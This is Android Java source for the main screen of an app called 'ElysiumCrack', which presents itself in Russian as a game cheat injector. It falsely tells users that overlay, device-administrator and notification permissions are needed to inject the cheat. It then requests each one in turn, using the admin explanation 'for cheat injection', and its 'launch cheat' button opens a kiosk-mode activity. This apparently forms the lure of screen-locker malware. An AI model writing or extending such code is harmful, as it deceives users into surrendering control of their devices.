package com.elysium.crack;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int REQ_NOTIF = 100;
    private boolean isMainMenu = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        showIntroScreen();
    }

    // Общий метод для создания экрана с фоном и затемнением
    private LinearLayout createBackgroundLayout() {
        FrameLayout root = new FrameLayout(this);
        
        // 1. Твоя картинка на фоне
        View bg = new View(this);
        bg.setBackgroundResource(R.drawable.bg);
        FrameLayout.LayoutParams bgParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, 
                FrameLayout.LayoutParams.MATCH_PARENT);
        root.addView(bg, bgParams);

        // 2. Затемняющий слой (чтобы текст читался)
        View dimmer = new View(this);
        dimmer.setBackgroundColor(Color.parseColor("#99000000")); // 60% черного
        FrameLayout.LayoutParams dimParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, 
                FrameLayout.LayoutParams.MATCH_PARENT);
        root.addView(dimmer, dimParams);

        // 3. Слой для кнопок и текста
        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER);
        content.setPadding(60, 0, 60, 0);
        
        FrameLayout.LayoutParams contentParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, 
                FrameLayout.LayoutParams.MATCH_PARENT);
        root.addView(content, contentParams);

        // Возвращаем корневой элемент, но привязываем content к нему для удобства
        root.setTag(content);
        return content;
    }

    private void showIntroScreen() {
        LinearLayout ll = createBackgroundLayout();

        TextView title = new TextView(this);
        title.setText("ElysiumCrack");
        title.setTextColor(Color.WHITE);
        title.setTextSize(36);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        ll.addView(title);

        TextView info = new TextView(this);
        info.setText("Для успешного инжекта чита в игру\nнам нужны системные разрешения.\nБез них приложение не сможет\nвнедриться в процесс игры.");
        info.setTextColor(Color.parseColor("#DDDDDD"));
        info.setTextSize(18);
        info.setGravity(Gravity.CENTER);
        info.setPadding(0, 40, 0, 60);
        info.setLineSpacing(10, 1);
        ll.addView(info);

        Button btnOk = createBtn("ОК, ДАТЬ РАЗРЕШЕНИЯ", Color.parseColor("#1B5E20"));
        btnOk.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
        ll.addView(btnOk);

        // Достаем корневой контейнер и ставим его на экран
        setContentView(((View) ll.getParent()));
    }

    private void requestAllPermissions() {
        if (!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Выдай разрешение Overlay", Toast.LENGTH_SHORT).show();
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())));
            return;
        }

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(componentName())) {
            Toast.makeText(this, "Активируй Администратора", Toast.LENGTH_SHORT).show();
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName());
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Для инжекта чита");
            startActivity(i);
            return;
        }

        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Дай разрешение на уведомления", Toast.LENGTH_SHORT).show();
                requestPermissions(new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIF);
                return;
            }
        }

        showMainMenu();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_NOTIF) {
            requestAllPermissions(); 
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!isMainMenu && Settings.canDrawOverlays(this)) {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm.isAdminActive(componentName())) {
                boolean notif = true;
                if (Build.VERSION.SDK_INT >= 33) {
                    notif = checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) == android.content.pm.PackageManager.PERMISSION_GRANTED;
                }
                if (notif) {
                    showMainMenu();
                }
            }
        }
    }

    private void showMainMenu() {
        isMainMenu = true;
        
        LinearLayout ll = createBackgroundLayout();

        TextView title = new TextView(this);
        title.setText("ELYSIUM\nCRACK");
        title.setTextColor(Color.parseColor("#FF4444")); 
        title.setTextSize(50);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        title.setLineSpacing(0, 0.9f);
        ll.addView(title);

        TextView status = new TextView(this);
        status.setText("\nСтатус: ГОТОВ К ИНЖЕКТУ\nВерсия: 1.1.0");
        status.setTextColor(Color.parseColor("#00FF00"));
        status.setTextSize(16);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 20, 0, 80);
        ll.addView(status);

        Button btnLaunch = createBtn("ЗАПУСТИТЬ ЧИТ", Color.parseColor("#FF4444"));
        btnLaunch.setTextSize(22);
        btnLaunch.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                launchKiosk();
            }
        });
        ll.addView(btnLaunch);

        // Достаем корневой контейнер и ставим его на экран
        setContentView(((View) ll.getParent()));
    }

    private Button createBtn(String text, int color) {
        Button b = new Button(this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 15, 0, 15);
        b.setLayoutParams(lp);
        
        GradientDrawable shape = new GradientDrawable();
        shape.setShape(GradientDrawable.RECTANGLE);
        shape.setCornerRadius(30);
        shape.setColor(color);
        b.setBackground(shape);

        b.setText(text);
        b.setTextColor(Color.WHITE);
        b.setTypeface(null, Typeface.BOLD);
        b.setPadding(0, 40, 0, 40);
        return b;
    }

    private void launchKiosk() {
        startActivity(new Intent(this, KioskActivity.class));
        finish();
    }

    private ComponentName componentName() {
        return new ComponentName(this, AdminReceiver.class);
    }
}
